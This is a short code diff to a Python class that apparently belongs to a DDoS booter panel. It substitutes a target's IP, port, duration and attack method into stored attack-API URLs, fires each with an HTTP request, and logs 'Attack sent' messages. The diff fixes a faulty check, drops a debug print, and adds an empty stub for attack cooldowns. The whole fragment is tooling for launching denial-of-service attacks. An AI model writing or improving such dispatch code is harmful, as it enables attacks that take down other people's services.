@@ -152,7 +152,7 @@ class APIFunc:
 
         Response = ""
 
-        if isinstance(len(APIs), list):
+        if len(APIs) > 0:
             for u in APIs:
                 u[1] = u[1].replace("{ip}", f"{ip}")
                 u[1] = u[1].replace("{host}", f"{ip}")
@@ -160,7 +160,6 @@ class APIFunc:
                 u[1] = u[1].replace("{time}", f"{time}")
                 lol = APICrud.fixFunneledMethods(u[0], method)
                 u[1] = u[1].replace("{method}", lol)
-                print(f"Line 165 {u}")
                 output = requests.get(f"{u[1]}").text
                 print(output) ## debug
                 Response += f"[+] Attack sent {ip}:{port} for {time} seconds with {method} | {u[0]}\r\n"
@@ -178,6 +177,12 @@ class APIFunc:
 
         return Response
 
+    """
+    Cooldown and Timer Countdown for attack to down 1 concurrent via db
+    """
 
-
-
+    def NewAttack():
+        #This will go in a new thread
+        # code a nrew function for it
+        
+        pass
